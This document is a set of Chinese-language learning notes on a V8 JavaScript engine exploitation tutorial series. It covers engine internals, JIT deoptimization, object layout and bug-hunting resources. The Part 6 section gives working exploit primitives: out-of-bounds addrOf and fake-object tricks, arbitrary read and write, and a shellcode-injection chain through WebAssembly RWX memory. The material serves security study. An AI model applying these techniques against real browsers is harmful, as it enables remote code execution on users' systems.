# Chrome V8

我这次真的只做最简短的笔记，真的（

Part-1包含大部分外部资源和作者编写教程的动机，此处省略

## [Part 2](https://www.madstacks.dev/posts/V8-Exploitation-Series-Part-2)

V8是chrome浏览器里很小的一部分，存在沙盒，因此没法直接通过v8漏洞控制整个系统，一般只针对v8进程。v8高度模块化，所以可以脱离Chromium内部其他的代码学习

解释型语言通常需要经历一个从中间语言转换成cpu支持的指令的过程，故运行速度很慢。不过大部分js引擎选择将js代码编译成特定架构的机器码，称为Just-in-Time (JIT)编译。编译过程前期消耗较大，但是运行起来很快。面对一段代码，js引擎首选第一种做法；当检测到某段代码被多次运行后，则会编译代码

v8中比较重要的部分：
- [Ignition](https://v8.dev/docs/ignition):v8的解释器,负责生成js的字节码
- Turbofan:v8唯一的编译器(2017年前用的是Crankshaft)。当v8检测到某段代码被调用多次后，Turbofan会编译这段代码，并在未来的调用中重定向程序控制流到编译好的JIT段。大部分v8 bug都在这里出现，因为js本来是“不该”被编译的
- [Liftoff](https://v8.dev/blog/liftoff)：负责从WebAssembly创建机器码。能够快速编译WebAssembly，不过具体的优化过程还是靠Turbofan。区别于Ignition，它会立刻将编译结果交给Turbofan，而不是等待一段代码被运行多次后
- [Torque](https://v8.dev/docs/torque)和CodeStubAssembler( [CSA](https://v8.dev/blog/csa) )：为了获得更好的性能，v8预编译了ECMAScript标准定义的内置（built-in）函数。本来是用CSA写的，但是手写这些汇编函数导致了太多bug，于是Torque出现了。Torque帮助开发者在v8支持的各种架构中为内置函数编写高效的代码

## [Part 3](https://www.madstacks.dev/posts/V8-Exploitation-Series-Part-3)

本章开始介绍了如何编译v8引擎。可以按照教程里的步骤编译，不过网上也有现成的v8 binary。主要还是看`v8/src/`下的内容

- [d8](https://v8.dev/docs/d8)
    - 本地编译会得到一个名为d8的binary，是v8的轻量包装器（lightweight wrapper）
    - v8通常嵌入在另一个程序中使用，因此`d8/d8.cc`内部调用v8的api来开启[Isolate](https://v8docs.nodesource.com/node-4.8/d5/dda/classv8_1_1_isolate.html)从而运行js代码
    - d8内部会引用一些诸如[fuzzilli](https://github.com/googleprojectzero/fuzzilli)的调试工具
    - gdb可以调试d8，在main或任何感兴趣的函数下断点即可。`out/x64.[release||debug]/d8`都含有符号，但debug版本还能看到源码
- api
    - api向嵌入者公开端点（exposes endpoints to the embedder），从而启动初始化（堆，Ignition等组件）并提供后续有用的其他函数
    - api使应用程序可以像其他任何c++库一样使用v8
- init / base
    - 启动相关的任务通常在这两个文件夹下。可以trace `init/v8.cc`来查看v8启动时的路径。不过base下的文件包含更多启动相关的代码
- codegen
    - 负责用Ignition或Turbofan编译代码并返回指向编译好的代码段的指针
    - 负责收集编译统计信息并报告该信息
- execution
    - 负责运行脚本。嵌入者需要单独调用函数来运行编译后的js：创建内存区域，映射代码并运行
    - 在`compiler.cc`处trace运行过程
- interpreter
    - 包含Ignition的部分功能。仍有部分内容位于其他位置（比如说解析器（parser））。逻辑主要位于`interpreter.cc`
    - d8内置了调试功能，不过仍然可以用gdb查看调用链
- compiler
    - Turbofan相关代码
- common
    - 这里有个`globals.h`文件定义了很多常数项
- torque / builtins / objects
    - 大部分`.tq` (torque)文件位于builtins和objects，实现了ECMAScript指定的常用函数
    - torque文件夹做的事见 https://v8.dev/docs/torque#how-torque-generates-code 。负责从`.tq`文件生成代码。main函数位于`torque.cc`
- flags / runtime
    - flags定义了启动v8时可以传给v8的可选标志（flags），可以用d8设置。之后会经常用到`--allow-natives-syntax`，允许我们从js代码中调用某些函数
    - `runtime/runtime.cc`定义了很多有助于调试v8的运行时函数，实现也在同一目录下
- wasm
    - 与Liftoff有关

## [Part 4](https://www.madstacks.dev/posts/V8-Exploitation-Series-Part-4)

Turbofan使用稍微修改后的[Sea of Nodes](https://darksi.de/d.sea-of-nodes)结构。编译器对Ignition生成的Abstract Syntax Tree (AST)进行一系列优化，从而缩小graph并将其转化为机器码。优化阶段里，node之间可以合并，拆分，或是更改名字。每个阶段都使用[Visitor pattern](https://en.wikipedia.org/wiki/Visitor_pattern)

优化相关事项其实是在Turbofan以外的地方决定的。所以关于js源码和最终JIT代码之间的Intermediate Representation (IR)，先看去优化（Deoptimization，简称deopt）。deopt在Turbofan生成的JIT代码中调用。V8中有两种deopt，急切（eager）和懒惰（lazy）

- eager：当前执行的代码需要进行去优化（The code currently being executed needs to be deoptimized）
- lazy：当前执行的代码使其他代码无效（The code currently being executed invalidates some other code）

eager deopt例子如下：
```js
function f(x) { 
    return x + 1; 
}
//对整数参数进行优化
for (i = 0; i < 1000000; i++) { 
    f(i);
}
//当使用字符串作为参数时，执行去优化
f("1");
```
字符串参数使之前认为参数是整数的假设无效。v8在JIT代码间放置检查来验证假设。如果检查失败，则会立即跳回解释器（interpreter）

当优化后的代码影响了其他优化后的代码，需要去优化那个被影响的代码，因为我们可能会破坏它的假设。v8用调用去优化的代码来替换掉被影响的函数的代码。可以看出去优化只会在这个函数被运行时调用，所以是”lazy“（我不确定我是不是看错了，这怎么跑去deopt其他函数了？它自己会不会被deopt啊？放段原文）

...if our optimized code affects some other optimized code, we need to deoptimize that other code because we may have broken some of its assumptions. It now replaces the code of other functions with calls to deoptimize. Since the deoptimization will happen later, whenever that other code is run, this is called lazy

如果函数出现问题，可以查看解释器。去优化的全部原因见`src/deoptimize-reason.h`。使用d8的`--trace-deopt`标志可以查看哪些函数被deopt了

将js代码放入树后（Once we get all of our JavaScript put into a tree。这个tree应该是IR tree，不知道是否和前文的sea of nodes结构有关系？）就可以添加各个node的信息了，帮助我们折叠（collapse）node（可能是把信息类似的node折叠成一个之类的？）。信息可能包含副作用（side-effect），控制流相关信息（control flow relevance），以及node的类型和可能值的范围。typing过程就是字面意思，决定node的类型和可能值。参考这个例子：
```js
var x = 5;
if (y == 10) {
    x = 10;
}
if (x < 5) {
    //无法到达的语句。x的可能值范围为5-10，总之绝对不可能小于5。if可以被移除
}
```
并不是所有代码都可以被优化，比如下面这个例子：
```js
function example(x, y) {
    if (y == 10) {
        x = 10;
    }
    if (x < 5) {
        //编译器不知道是否能到达此处，因为优化过程仅发生在这个函数范围内
    }
}
//优化
for (i = 0; i < 1000000; i++) { 
    example(i, 0);
}
//这种情况下if语句是多余的
var z1 = 5;
var z2 = 10;
example(z1, z2);
```
`types.h`包含所有存在的类型以及注释。注意NaN和负零（MinusZero）都有自己的值，以及各种数字的表示

数组（array）有多种类型，方便给不同类型的数组应用不同的优化。比如：
```js
let arr1 = [0, 1, 2];
let arr2 = new Array(1000);
arr2[0] = 0;
arr2[999] = 999;
```
arr1用3块连续的内存存储；然而arr2只存储两个值以及对应的索引。这就是packed和holey数组的差别

折叠nodes过程中代码里出现的术语
- union：合并两个输入（input，指代折叠的两个node？）的全部可能值
- intersect：仅合并两个输入的匹配值（matching values）
- phi：编译器需要在不同的执行路径追踪变量，因此需要给同一个变量指定不同的中间标识符（intermediate identifiers）。当执行路径合并时，合并不同路径中同一变量的可能值
- is（`node.Is(arg)`）：若node是给定的参数arg的子集，则它“是”参数arg
- maybe(`node.Maybe(arg)`)：若参数arg是node的所有类型的子集，则node“可能”是参数arg（不确定是不是反了，maybe和is检查的方向不一样？）

d8中有助于调试的标志：
- `--trace-turbo`：以json格式输出脚本中被优化函数的IR
- `--trace-turbo-filter`：指定trace的函数
- `--print-opt-code --print-code-verbose --code-comments`：获取Turbofan输出的机器码的更多信息
- `--trace-opt`：查看函数何时被优化以及原因
- `--print-bytecode`：打印原始的Ignition bytecode

以下是三种触发函数优化的方式（假设test函数中包含需要被优化的代码）。三种方法不会以完全相同的方式触发漏洞
1. 调用函数足够多次
```js
for (var i=0; i < 1000000; i++) {
    test();
}
```
2. 使用`--allow-natives-syntax`标志并直接调用v8内置函数
```js
%OptimizeFunctionOnNextCall(test);
test();
```
3. 比上一个方法多调用一个函数
```js
%PrepareFunctionForOptimization(test);
test();
%OptimizeFunctionOnNextCall(test);
test();
```
`--trace-turbo`输出的json文件可以用[Turbolizer](https://v8.github.io/tools/head/turbolizer/index.html)查看。可用于检查编译器是否正确优化了代码

`node.h`包含很多注释，详细介绍了`Node`结构，对理解优化非常重要。结构中包含ID，类型信息，相邻node以及构成IR node的其他信息。此结构的成员名称不直观，因此需要了解在哪里查找结构成员

`operator.h`包含`Operator`结构的定义

## [Part 5](https://www.madstacks.dev/posts/V8-Exploitation-Series-Part-5)

v8使用指针压缩（pointer compression）缩减内存使用。通过存储指针相对于基地址的偏移，原本64bit的指针现在只需要32bit

js里的变量一般存储为指向对象的指针（c++对象，不是js对象）。不过整数的操作很多，而且通常都是简单的操作，所以可以直接在存指针的地方存储数值。比如这样：
```
            |----- 32 bits -----|----- 32 bits -----|
Pointer:    |________________address______________w1|
Smi:        |____int32_value____|0000000000000000000|
(small integer)
```
指针都是字对齐的（word-aligned），所以可以将lsb标记为1来区分开指针和整数（称为TaggedPtr）。压缩后也可以这么做。问题是压缩后32bit的整数有可能lsb为1。解决办法是只用31bit表示整数，这样lsb就永远为0了（我的疑惑是万一这个整数有完整的32bit信息呢？这不就损失数据了吗？可能v8设计得不会有这种情况？）
```
                        |----- 32 bits -----|
Pointer:                |_____address_____w1|
Smi:                    |___int31_value____0|
```
`objects/objects.h`中列出了全部的object类型。js里几乎所有东西都是`Object`，v8里几乎所有东西都是`HeapObject`。除了`SMI`和`TaggedIndex`

对象包含属性（方法也算）；每个属性都有三个标志，指示当前属性是否可写，可枚举（enumerable）和可配置（configurable）

js里的属性更像字典，属性名为键。为了节省内存，相似的对象只会存储一个字典，值则在其他地方，键值之间用“map”和偏移值联系起来：
```
// Naive case structure in memory
obj_1 = {"x": {"value": 5, ...}, "y": {"value": 6, ...}}
obj_2 = {"x": {"value": 7, ...}, "y": {"value": 8, ...}}

// Efficient case structure in memory
obj_case1_dict = {"x": {"offset": 0, ...}, "y": {"offset": 1, ...}}
obj1 = [5, 6, &obj_case1_dict] // not an accurate layout, but we'll fix this soon
obj2 = [7, 8, &obj_case1_dict] // not an accurate layout, but we'll fix this soon
// "..." here represents the enumerable, writable, and configurable flags
```
- 无论shapes, hidden classes, types, structure, 还是maps指的都是对象属性的布局。名称可以互换，因为不同js引擎使用不同的名称。v8使用术语“map”

在更高效的结构中，多个对象之间使用同一个字典，键是属性名，值是内存中属性值存储位置相对于对象位置的偏移

注意上文中`not an accurate layout`的部分。说对象中包含一个指向map的指针其实不准确，指针实际上指向的是transition tree的末尾（条目链中的map条目，map entry in a chain of entries）。某种意义上还是个字典，只不过属性之间由指针相连，而大部分字典中的属性存储在一块连续的内存中。对象添加属性时会创建新的条目（entry），包含指向树的末尾的指针。说map是字典，其实更像链表（linked lists）。至于transition tree为啥叫树，因为多个对象间可以共享一些属性，但添加不同属性时可能会产生分支。访问属性时，会向后遍历整个链条（chain is walked backwards），直到找到目标属性

![transition tree](https://i.imgur.com/nw5XMkc.png)

map指代的是上述结构，内部还包含对象的很多信息。见`objects/map.h`

数组（arrays）是特殊类型的object，可以想象成数组类是object的子类。数组使用数字索引来映射值，意味着大量属性只是连续的数字而已。因此，v8除了用map存储诸如length的属性外，还有个后备存储（backing store）。直接指向数组里的元素

数组和object的内存结构是一样的。假如一个object有数字键属性，对应的值也有后备存储

v8根据“元素类型（elements kinds,数组根据元素的类型和间距存储元素的不同方式）”描述数组。`objects/elements-kind.h`列出了数组的全部类型。数组的类型与其在内存中的布局和可执行的优化有关

v8通过将查询结果存储到指令处来减少查询属性的用时。当生成查找属性相关的bytecode指令时，编译器使binary中有空间存储属性值（When object property lookup bytecode instructions are generated, they have room in the binary for data to be stored。不太确定这里的they指的是编译器还是binary还是bytecode instruction？）。这些空间在运行时将填以map中定义的偏移和属性的实际值。inline caches的相关代码位于`src/ic`

在d8中使用`--allow-natives-syntax`标志然后调用`%DebugPrint()`函数即可查看v8内存中变量的结构。不过这样看不到内存布局，此时可以用gdb

将`tools/gdbinit`文件以`.gdbinit`文件名存储于家目录下；或者把里面的内容添加到已经存在的`.gdbinit`中；再或者调用`source <path to v8>/tools/gdbinit`即可进行调试。文件中的`define`处定义了新添加的命令

注意pwndbg中的一些命令会与v8冲突，只能通过更换其他调试器解决。以下是一些调试相关的资源
- [v8-debugging-tools](https://github.com/JeremyFetiveau/debugging-tools)
- [Tips and Tricks for Node.js Core Development and Debugging](https://joyeecheung.github.io/blog/2018/12/31/tips-and-tricks-node-core)

## [Part 6](https://www.madstacks.dev/posts/V8-Exploitation-Series-Part-6)

现在假设v8题目中存在漏洞，允许我们对array进行任意读写，忽视array真正的长度和原本的边界

v8存储数据的布局中比较重要的内容如下：
- 浮点数（floats）以64位表示
- 指针以32位表示，lsb固定为1
- 整数以31位表示，lsb固定为0
- 可以用BigInt相互转换64位整数和浮点数
- 数组的类型决定数组中的每个元素位（slot）是64位还是32位

利用越界读数组+字符串数组泄漏地址：
```js
oob_array = [1.1, 2.2, 3.3, 4.4, 5.5];
victim = [{}, {}, {}, {}, {}];

// trigger some vulnerability to get OOB access

// place target object in victim array
victim[0] = a;

// float representation of TaggedPtr to a
console.log(lower_32(float_to_int(oob_array[8])));
```
注意偏移和实际数组的布局都是假设，仅作基础的原理展示。假设上述设置在内存中的布局如下：
```
        4 bytes       
+--------------------+    <- begin oob_array's backing store
-       map ptr      -
+--------------------+
-   length of store  -
+--------------------+
-    oob_array[0]    -
+--------------------+
-    oob_array[0]    -
+--------------------+
...
+--------------------+
-    oob_array[4]    -
+--------------------+
-    oob_array[4]    -
+--------------------+    <- begin victim
-       map ptr      -
+--------------------+
-   properties ptr   -
+--------------------+
-  backing store ptr -    ----------------------------------
+--------------------+                                      |
-   length of array  -                                      |
+--------------------+    <- begin victim's backing store <-
-       map ptr      -
+--------------------+
-   length of store  -
+--------------------+
-      victim[0]     -    <- pointer to a, oob_array[8] lower_32
+--------------------+
-      victim[1]     -    <- oob_array[8] upper_32
+--------------------+
...
```
victim数组存储objects，但oob_array存储浮点数。因此，对oob_array的越界读可以用浮点数的形式读取a的地址，解码成整数再减一即可得到真正的内存地址

浮点数没有lsb固定为0或者1的限制，因此在读写指针方面比整数好用不少，虽然需要经过一些类型转换

利用越界写数组修改其他数组的内存布局：
```js
oob_array = [1.1, 2.2, 3.3, 4.4, 5.5];
victim = [{}, {}, {}, {}, {}];

// trigger some vulnerability to get OOB access

// place target object in victim array
victim[0] = a;

oob_array[8] = int_to_float(address_we_want + 1);

return victim[0];
```
现在当我们访问`victim[0]`时，得到的已经不是a了，而是我们构造的位于`address_we_want`的fake object。注意要保证`address_we_want`处的fake object拥有正确的结构，参考 https://www.madstacks.dev/posts/V8-Exploitation-Series-Part-5/#exploring-the-object-layout 。其中一个用法是创建两个object，泄漏两者的地址后交换它们的map，backing store或者length等字段

利用越界读写数组实现任意地址写：
```js
oob_array = [1.1, 2.2, 3.3, 4.4, 5.5];
victim = [1.1, 2.2, 3.3, 4.4, 5.5];

// trigger some vulnerability to get OOB access
    
function arb_read(addr) {
    // we need to subtract 8 because a backing store starts with 2, 4-byte pointers
    oob_array[6] = int_to_float((addr + 1) - 8);
    
    return float_to_int(victim[0]);
}

function arb_write(addr, val) {    
    // we need to subtract 8 because a backing store starts with 2, 4-byte pointers
    oob_array[6] = int_to_float((addr + 1) - 8);
    
    victim[0] = int_to_float(val);
}
```
查看第一个例子里提供的图表，发现victim对象的backing store指针指向对象的末尾，数据开始的地方。如果我们覆盖这个指针，等同于告诉v8访问任意地址处的内存

注意以浮点数形式覆盖指针实际上会损坏相邻的指针，因为浮点数占8个字节而指针只占4个字节。在实际的漏洞利用中必须考虑这点，恢复那个相邻的指针

这个例子说是任意地址读写，其实不完全是。v8中的指针都是相对于基地址的偏移，所以这个办法不能脱离基地址读写其他地方。需要改变基地址才能访问这段区域之外的内存，这就需要用到ArrayBuffers了

ArrayBuffers类似array，但可以更简单地写入二进制数据。ArrayBuffers可以在连续的内存区域中写二进制数据，区别于数组会根据存储元素的位置改变内存布局。可以设置与ArrayBuffers交互的形式，如整数，浮点数等，且不必担心ArrayBuffers变成"holey"。最重要的是，ArrayBuffer的backing store指针是64位的。例子：
```js
// create ArrayBuffer and dataview
buf = new ArrayBuffer(NUM_BYTES);
dataview = new DataView(buf);

// get the address of buf's backing store
buf_addr = addrOf(buf);
backing_store_addr = buf_addr + 0x14n;

// overwrite the backing store pointer with a pointer to our desired memory location
arb_write(backing_store_addr + 1, RW_MEM_LOCATION);

// write dword to RW_MEM_LOCATION
dataview.setUint32(0, 0x41424344, true);
```
有了任意地址读写后就能了解一种最简单的RCE方式了。WebAssembly JIT代码段的权限是rwx，只需往里面写shellcode并控制程序流到此处即可。首先需要添加WebAssembly：
```js
var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var f = wasm_instance.exports.main;
```
wasm_code的内容不重要，比如案例中wasm_code的内容仅仅是返回42

这段代码使v8创建一块0x1000字节大小的RWX内存区域，用于存储生成的机器码。然而上文的AddrOf（指的应该是第一个例子）不足以泄漏这块区域的地址。还好这个地址存储在创建的WebAssembly实例里，位于某个偏移处。这个偏移在不同的v8版本里不一样，需要自行用gdb查看。参考这个脚本：
```js
var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var f = wasm_instance.exports.main;

%DebugPrint(f);

console.log("\nvmmap to get the RWX page address");
console.log("search -x [little_endian_address]");
console.log("Subtract the address of wasm_instance from the address of our pointer");

while(1){}

// gdb d8
// r wasm_offset_finder.js --allow-natives-syntax
// Ctrl+C
```
步骤如下：
1. 找到RWX页的起始内存地址
2. 寻找指向这个地址的指针（就在WASM实例的起始地址后面一点点）
3. 计算这个指针与WASM实例的偏移

得到偏移后可以像这样注入shellcode并调用：
```js
// https://xz.aliyun.com/t/5003 (tested on ubuntu 20.04)
var shellcode=[0x90909090,0x90909090,0x782fb848,0x636c6163,0x48500000,0x73752fb8,0x69622f72,0x8948506e, 0xc03148e7,0x89485750,0xd23148e6,0x3ac0c748,0x50000030,0x4944b848,0x414c5053,0x48503d59,0x3148e289,0x485250c0,0xc748e289,0x00003bc0,0x050f00];

// get address of RWX memory
rwx_page_addr = arb_read(tagInt(addrOf(wasm_instance)) + WASM_PAGE_OFFSET);

// create dataview for easy memory writing
let buf = new ArrayBuffer(shellcode.length * 4);
let dataview = new DataView(buf);

// move dataview to RWX memory
let buf_addr = addrOf(buf);
let backing_store_addr = buf_addr + 0x14n;
arb_write(tagInt(backing_store_addr), rwx_page_addr);

// copy shellcode
for (let i = 0; i < shellcode.length; i++) {
	dataview.setUint32(4 * i, shellcode[i], true);
}
	
// jump to RWX memory
//调用WebAssembly函数从而执行shellcode
f();

// credit: https://abiondo.me/2019/01/02/exploiting-math-expm1-v8/
```
利用数组的越界访问获取RCE的完整例子见 https://www.madstacks.dev/assets/exploits/exploit_skeleton.js 。脚本里还有很多辅助函数（Helper Functions
），主要是一些ArrayBuffers的用法以及如何转换数据类型。还包含了一些处理32位和64位数据以及指针压缩的函数

不要多次尝试触发漏洞。一次命中最好，因为多余的循环会扰乱堆的布局，遇见垃圾处理器（garbage collector）的相关问题，或是直接崩溃。最好用全局变量来利用漏洞，而不是像前文的例子一样用局部变量。遵循这些原则后可以得到一个可靠的堆布局

另一个常见的问题是漏洞不提供大范围的越界读写。这种情况下修改相邻array的length属性即可。创建一个整数的oob_array，这样越界写length属性时不需要担心数据类型问题
```js
oob_array = [1, 2, 3, 4, 5];
victim = [{}, {}, {}, {}, {}];

// trigger some vulnerability to get OOB access

console.log(victim.length);
// 5
oob_array[9] = 10;
console.log(victim.length);
// 10
```
相邻victim array的length属性大概在oob_array后4 words的地方。如果只能越界一个索引，这篇[wp](https://faraz.faith/2019-12-13-starctf-oob-v8-indepth)介绍了一个不错的技巧；如果能越界两个索引，用一个float数组并只修改高32位即可

另一个提高exp的稳定性的原则是“恢复被覆盖的旧值”，防止各种随机的崩溃

最后，很多exp都会标记特殊的值从而标记并确保堆布局正确。可以考虑在exp里添加某些浮点数并在触发漏洞后确认这些值在期望的正确位置

## [Part 7](https://www.madstacks.dev/posts/V8-Exploitation-Series-Part-7)

最后一篇！

除了读codebase，实践也是很好的学习方式，比如学习N-Days漏洞。旧bug可以帮助发现新bug，且一个bug被发现后，有很大的概率类似的bug同样存在

### Bug Trackers

- v8的bug list： https://issues.chromium.org/issues?q=componentid:1456824%2B%20is:open
- Chromium tracking list： https://bugs.chromium.org/p/chromium/issues/list?q=Type%3D%22Bug-Security%22%20component%3DBlink%3EJavaScript%3ECompiler&can=1
    - 使用`Type="Bug-Security" component=Blink>JavaScript>Compiler`过滤器过滤有用的信息（不过我没搜出来任何东西
    - 重要的bug在被关闭后的14周后才能看见
    - Bug report包含poc，code base解析，和bug是如何被触发和修复的。以及最重要的，新的exploitation技巧

### Chrome Releases

假如没时间看Bug Trackers的话……

- chrome release： https://chromereleases.googleblog.com
    - 包含了过去六周被修复的重大漏洞
    - 附带简短的漏洞列表和介绍
    - 仅在漏洞被修复后才会发布，时间间隔较长

### Git Changelog

查看最近的patch：

- V8 log： https://chromium.googlesource.com/v8/v8.git/+log
- github v8 mirror： https://github.com/v8/v8/commits/master

在命令行运行`git log origin/master`可以查看master分支的日志。虽然大部分改动都与安全无关，但是commit message里通常带有bug id。拿着这个id就能在bug tracker和changelog里查看这个bug是否是安全问题

chrome有自己的更新周期。神奇的地方在于，漏洞在更新之前就被披露和“修补”，但此时用户是无法拿到patch的，因为还没到更新时间。见 https://blog.exodusintel.com/2019/04/03/a-window-of-opportunity

### Posts

v8团队有[推特账号](https://twitter.com/v8js)和[博客](https://v8.dev/blog)，两者均会发布有关v8改动的内容。博客通常以开发者的视角编写，因此添加了很多对于代码的解析

- Google Project Zero Blog: https://googleprojectzero.blogspot.com
    - 虽然不专注于v8，但经常研究浏览器漏洞。以下是一些关于chrome和v8的文章：
        - https://googleprojectzero.blogspot.com/2019/05/trashing-flow-of-data.html
        - https://googleprojectzero.blogspot.com/2019/04/virtually-unlimited-memory-escaping.html
        - https://googleprojectzero.blogspot.com/2020/02/escaping-chrome-sandbox-with-ridl.html

### Fuzzing

对于大型软件，fuzzing可以帮助测试大量的案例，便于查看哪个案例能使系统崩溃

- ClusterFuzz: https://blog.chromium.org/2012/04/fuzzing-for-security.html
    - chrome主要的fuzzer，包含不同的组件来测试某个特定的功能，比如[javascript](https://github.com/v8/v8/tree/master/tools/clusterfuzz/js_fuzzer)
    - 手动代码审查发现的漏洞也能输入到ClusterFuzz中，用于查看受影响的chrome版本范围并帮助修复
    - 已经集成到v8中，比如address sanitization（google的[sanitizers](https://github.com/google/sanitizers)中的一个）
- FuzzIL： https://saelo.github.io/papers/thesis.pdf
    - 不是专门fuzz v8的fuzzer，但是也发现了一些漏洞，比如 https://sensepost.com/blog/2020/the-hunt-for-chromium-issue-1072171
- DIE： https://github.com/sslab-gatech/DIE
- 使用Dharma/Domato fuzz liftoff： https://fuzzinglabs.com/fuzzing-javascript-wasm-dharma-chrome-v8
- Getting started with fuzzing in Chromium： https://chromium.googlesource.com/chromium/src/+/master/testing/libfuzzer/getting_started.md
- How to make a libFuzzer fuzzer in V8： https://chromium.googlesource.com/v8/v8/+/refs/heads/master/test/fuzzer/README.md

### Checks

v8代码中包含大量CHECK和DCHECK宏定义。CHECK检查的条件都是必须满足的，若不满足会使浏览器崩溃，否则会有安全问题。DCHECK仅在debug build中存在，用于检查应该永远为真的前置条件和后置条件

这些语句帮助fuzzers定位错误